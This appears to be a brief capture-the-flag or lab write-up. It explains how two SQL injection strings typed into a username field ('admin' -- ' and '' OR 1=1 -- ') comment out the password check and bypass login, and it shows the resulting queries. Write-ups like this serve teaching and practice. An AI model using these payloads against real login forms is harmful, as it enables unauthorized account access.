## Write-Up

To solve the task, enter the following string in the username field: `admin' -- `

This results in the following query being executed in the DBMS:

```sql
SELECT * FROM users WHERE username='admin' -- AND password='...'
```

This bypasses authentication.

Alternatively, use `' OR 1=1 -- `, which results in:

```sql
SELECT * FROM users WHERE username='' OR 1=1 -- AND password='...'
```
